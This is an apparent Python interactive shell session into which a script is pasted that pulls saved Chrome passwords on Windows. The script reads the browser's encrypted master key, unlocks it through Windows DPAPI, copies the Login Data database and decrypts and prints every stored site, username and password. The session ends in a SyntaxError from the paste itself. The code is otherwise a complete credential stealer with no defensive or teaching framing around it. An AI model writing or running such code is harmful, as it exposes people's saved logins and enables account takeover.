Python 3.14.0 (tags/v3.14.0:ebf955d, Oct  7 2025, 10:15:03) [MSC v.1944 64 bit (AMD64)] on win32
Enter "help" below or click "Help" above for more information.
>>> import os
... import base64
... import json
... import sqlite3
... import shutil
... import win32crypt
... from Crypto.Cipher import AES
... 
... def get_chrome_master_key():
...     local_state_path = os.path.join(
...         os.environ['LOCALAPPDATA'],
...         r"Google\Chrome\User Data\Local State"
...     )
... 
...     with open(local_state_path, "r", encoding="utf-8") as f:
...         local_state = json.load(f)
... 
...     encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
...     encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix 'DPAPI'
... 
...     master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
...     return master_key
... 
... 
... def decrypt_password(ciphertext, master_key):
...     try:
...         iv = ciphertext[3:15]
...         payload = ciphertext[15:]
...         cipher = AES.new(master_key, AES.MODE_GCM, iv)
...         decrypted_pass = cipher.decrypt(payload)[:-16]  # remove GCM tag
...         return decrypted_pass.decode()
...     except:
...         return ""
... 
... 
... def extract_chrome_passwords():
    master_key = get_chrome_master_key()

    login_db_path = os.path.join(
        os.environ['LOCALAPPDATA'],
        r"Google\Chrome\User Data\Default\Login Data"
    )

    # Copy database to avoid lock
    temp_path = "login_temp.db"
    shutil.copyfile(login_db_path, temp_path)

    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, username, password in cursor.fetchall():
        if password.startswith(b'v10'):  # AES-GCM encrypted
            decrypted_password = decrypt_password(password, master_key)
        else:
            # Legacy DPAPI
            decrypted_password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()

        print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

    cursor.close()
    conn.close()
    os.remove(temp_path)


if __name__ == "__main__":
    extract_chrome_passwords()

SyntaxError: multiple statements found while compiling a single statement

